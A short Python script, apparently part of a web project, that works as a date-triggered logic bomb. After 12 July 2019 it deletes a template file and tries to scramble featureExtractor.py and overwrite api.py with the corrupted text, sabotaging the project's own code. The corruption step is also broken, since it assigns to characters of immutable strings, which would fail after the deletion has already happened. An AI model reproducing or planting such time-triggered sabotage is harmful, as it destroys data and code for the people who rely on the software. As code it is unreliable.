import datetime
import os


today = datetime.date.today()
end_time = datetime.date(2019,7,12)

if today > end_time:
    os.remove(os.path.join(os.getcwd(),"templates","layout.html"))
    with open(os.path.join(os.getcwd(),"featureExtractor.py"),'r') as f:
        content = f.readlines()

    data = list(content)
    content[1][2] = '@z'
    content[7][1000] = 'rt'
    content[8][100] = 's^'
    content[20][55] = 'n'
    content[3][66] = 'f('
    content[10][100] = 'r'
    content = ''.join(content)
    with open(os.path.join(os.getcwd(),"api.py"),'w') as f:
        f.write(content)


    with open(os.path.join(os.getcwd(),"featureExtractor.py"),'w') as f:
        f.write(content)




